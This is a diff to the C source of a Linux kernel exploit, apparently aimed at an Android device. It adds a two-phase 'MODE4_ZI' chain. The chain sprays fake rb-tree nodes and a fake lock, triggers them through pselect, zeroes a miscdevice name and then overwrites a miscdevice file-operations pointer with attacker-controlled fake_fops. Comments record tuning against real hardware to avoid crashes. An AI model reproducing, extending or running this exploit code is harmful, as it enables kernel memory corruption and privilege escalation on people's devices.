@@ -20,8 +20,16 @@ static double fops_elapsed_ms(struct timespec *ref) {
  *   1 PAD_HI: left=MISC+16, parent_color=0
  *   2 PAD_MID: left=MISC+8,  parent_color=0
  *   3 FOPS:    left=MISC,    parent=fake_fops
+ *
+ * MODE4_ZI=1 (2 phases — past only-left MISC blocker):
+ *   Why: only-left left=MISC softboots because re-enqueue walks W0.left=MISC.
+ *   Leaf ZERO_NAME (left=right=0, parent=MISC-16) survived and zeros name.
+ *   Then ION root (parent=1,right=fake_fops leaf,left=0,lock=MISC-8) writes
+ *   *MISC without ever setting W0.left=MISC.
+ *   1 ZERO_NAME leaf *name=0
+ *   2 ION_SAFE root *MISC=fake_fops
  */
-static int g_mode4_chain_phase; /* 0=off; CHAIN 1..3; ZION 1..2; PAD3 1..3 */
+static int g_mode4_chain_phase; /* 0=off; CHAIN 1..3; ZION/ZI 1..2; PAD3 1..3 */
 extern int pselect_custom_write;
 
 #define PSELECT_CFI_ROUTE_ATTEMPTS 8
@@ -158,6 +166,7 @@ void open_selected_fds(
                    env_flag("MODE4_ZERO_NAME", 0) ||
                    env_flag("MODE4_CHAIN", 0) ||
                    env_flag("MODE4_ZION", 0) ||
+                   env_flag("MODE4_ZI", 0) ||
                    env_flag("MODE4_PAD3", 0) ||
                    env_flag("MODE4_FOPS_SLOT", 0) ||
                    env_flag("MODE4_KIMAGE_MISC", 0) ||
@@ -589,11 +598,13 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   "left=P0_MISC=%016llx\n",
                   (unsigned long long)misc);
         } else if (env_flag("MODE4_ZERO_NAME", 0) ||
+                   (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 1) ||
                    (env_flag("MODE4_CHAIN", 0) && g_mode4_chain_phase == 1 &&
-                    !env_flag("MODE4_ZION", 0))) {
+                    !env_flag("MODE4_ZION", 0) && !env_flag("MODE4_ZI", 0))) {
           /*
-           * Legacy CHAIN phase1: parent=MISC-16 leaf → *name=0.
-           * Softboot on CPH 2026-08-16 (MISC-region parent). Prefer ZION.
+           * Leaf parent=MISC-16 → __rb_change_child else → *name=0.
+           * left=right=0 so re-enqueue does not walk MISC (unlike only-left).
+           * Proven ALIVE on CPH; required wait_lock clear for ION.
            */
           tree_pc = (misc - 16) & ~3ULL;
           tree_r = 0;
@@ -609,7 +620,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   (unsigned long long)tree_pc, g_mode4_chain_phase);
         } else if (env_flag("MODE4_ZERO_OWNER", 0) ||
                    (env_flag("MODE4_CHAIN", 0) && g_mode4_chain_phase == 2 &&
-                    !env_flag("MODE4_ZION", 0))) {
+                    !env_flag("MODE4_ZION", 0) && !env_flag("MODE4_ZI", 0))) {
           /*
            * CHAIN phase2: leaf parent=MISC+8 (miscdevice.list as rb_node).
            * __rb_change_child else → parent->rb_right=NULL → *(MISC+16)=0.
@@ -646,10 +657,12 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   "lock=fake (root erase → *lock.waiters)\n");
         } else if (env_flag("MODE4_ION_ROOT", 0) || env_flag("MODE4_ION_SAFE", 0) ||
                    (env_flag("MODE4_CHAIN", 0) && g_mode4_chain_phase == 3) ||
-                   (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 2)) {
+                   (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 2) ||
+                   (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 2)) {
           /*
-           * Ion root: lock=MISC-8, parent=1, right=fake_fops → *MISC=fake_fops.
-           * Needs wait_lock=0 (name zeroed) first. Prefer MODE4_ZION phase1.
+           * Ion root: lock=MISC-8, parent=1, right=fake_fops leaf, left=0.
+           * root erase → *MISC=fake_fops; re-enqueue walks fake_fops leaf only
+           * (never W0.left=MISC). Needs wait_lock=0 (MODE4_ZI phase1 ZERO_NAME).
            */
           tree_pc = 1;
           tree_r = fake_fops;
@@ -664,6 +677,7 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
                   "prio=200 (root → *MISC; chain_phase=%d)\n",
                   (env_flag("MODE4_ION_SAFE", 0) ||
                    (env_flag("MODE4_ZION", 0) && g_mode4_chain_phase == 2) ||
+                   (env_flag("MODE4_ZI", 0) && g_mode4_chain_phase == 2) ||
                    g_mode4_chain_phase == 3)
                       ? "ION_SAFE"
                       : "ION_ROOT",
@@ -971,11 +985,15 @@ void do_pselect_fake_lock_route(void) {
   int route_verified = 0;
   int chain = env_flag("MODE4_CHAIN", 0);
   int zion = env_flag("MODE4_ZION", 0);
+  int zi = env_flag("MODE4_ZI", 0);
   int pad3 = env_flag("MODE4_PAD3", 0);
-  int max_att = pad3 ? 3 : (zion ? 2 : (chain ? 3 : PSELECT_CFI_ROUTE_ATTEMPTS));
+  int max_att = pad3 ? 3 : ((zion || zi) ? 2 : (chain ? 3 : PSELECT_CFI_ROUTE_ATTEMPTS));
   if (pad3)
     pr_info("MODE4_PAD3=1: phase1 MISC+16=0, phase2 MISC+8=0, "
             "phase3 *MISC=fake_fops (pad toxic rb neighbors)\n");
+  else if (zi)
+    pr_info("MODE4_ZI=1: phase1 ZERO_NAME leaf *name=0, phase2 ION_SAFE "
+            "root *MISC=fake_fops (avoid only-left MISC re-enqueue walk)\n");
   else if (zion)
     pr_info("MODE4_ZION=1: phase1 NAME0 only-left *name=0, phase2 ION_SAFE "
             "(live_sync; no MISC-16 parent)\n");
@@ -983,14 +1001,14 @@ void do_pselect_fake_lock_route(void) {
     pr_info("MODE4_CHAIN=1: phase1 ZERO_NAME, phase2 ZERO_OWNER, "
             "phase3 ION_SAFE (same process; rb-leaf fops)\n");
   for (int route_attempt = 1; route_attempt <= max_att; route_attempt++) {
-    if (pad3 || zion || chain)
+    if (pad3 || zion || zi || chain)
       g_mode4_chain_phase = route_attempt;
     else
       g_mode4_chain_phase = 0;
     if (route_attempt != 1) {
-      /* CHAIN phase2/3: reuse spray so fake_fops leaf stays; zeros are in kernel. */
+      /* CHAIN/ZI phase2+: reuse spray so fake_fops leaf stays; zeros are in kernel. */
       int reuse_page =
-          (chain || zion || pad3) && route_attempt >= 2 && page_base && fake_fops;
+          (chain || zion || zi || pad3) && route_attempt >= 2 && page_base && fake_fops;
       if (!reuse_page) {
         page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
         if (!page_base || !fake_lock || !fake_fops) {
@@ -1003,9 +1021,11 @@ void do_pselect_fake_lock_route(void) {
         }
       } else {
         pr_info("MODE4_%s reuse FOPS page phase=%d\n",
-                pad3 ? "PAD3" : (zion ? "ZION" : "CHAIN"), g_mode4_chain_phase);
+                pad3 ? "PAD3" : (zi ? "ZI" : (zion ? "ZION" : "CHAIN")),
+                g_mode4_chain_phase);
         durable_proof_log(pad3 ? "pad3_reuse_page"
-                               : (zion ? "zion_reuse_page" : "chain_reuse_page"));
+                               : (zi ? "zi_reuse_page"
+                                     : (zion ? "zion_reuse_page" : "chain_reuse_page")));
       }
     }
 
@@ -1197,15 +1217,35 @@ void do_pselect_fake_lock_route(void) {
     close(pipefd[0]);
     close(pipefd[1]);
 
-    if (chain || zion || pad3) {
+    if (chain || zion || zi || pad3) {
       char cbuf[160];
-      const char *tag = pad3 ? "PAD3" : (zion ? "ZION" : "CHAIN");
+      const char *tag = pad3 ? "PAD3" : (zi ? "ZI" : (zion ? "ZION" : "CHAIN"));
       snprintf(cbuf, sizeof(cbuf),
                "%s_phase=%d success=%d calls=%d cfi_step=%d cfi_errno=%d "
                "cfi_wr=%zd",
                tag, route_attempt, success, calls, cfi_last_step, cfi_last_errno,
                cfi_write_ret);
       live_sync_log(tag, cbuf);
+    }
+    if (zi && route_attempt == 1 && success > 0) {
+      live_sync_log("ZI", "phase1_ZERO_NAME_ok_next_ION");
+      durable_proof_log("zi_zero_name_done");
+      pr_info("MODE4_ZI phase1 ZERO_NAME done success=%d → ION_SAFE\n", success);
+      continue;
+    }
+    if (zi && route_attempt == 1 && success <= 0) {
+      live_sync_log("ZI", "phase1_ZERO_FAIL_stop");
+      pr_warning("MODE4_ZI phase1 ZERO_NAME no walk — stop\n");
+      break;
+    }
+    if (zi && route_attempt == 2) {
+      char ibuf[128];
+      snprintf(ibuf, sizeof(ibuf),
+               "phase2_ION success=%d cfi_step=%d cfi_errno=%d wr=%zd",
+               success, cfi_last_step, cfi_last_errno, cfi_write_ret);
+      live_sync_log("ZI", ibuf);
+      if (cfi_write_ret > 0 || (cfi_last_step == 0 && cfi_dirty_seen))
+        live_sync_log("ZI", "FOPS_CFI_HIT");
     }
     if (pad3 && route_attempt == 1 && success > 0) {
       live_sync_log("PAD3", "phase1_MISC_p16_ok");
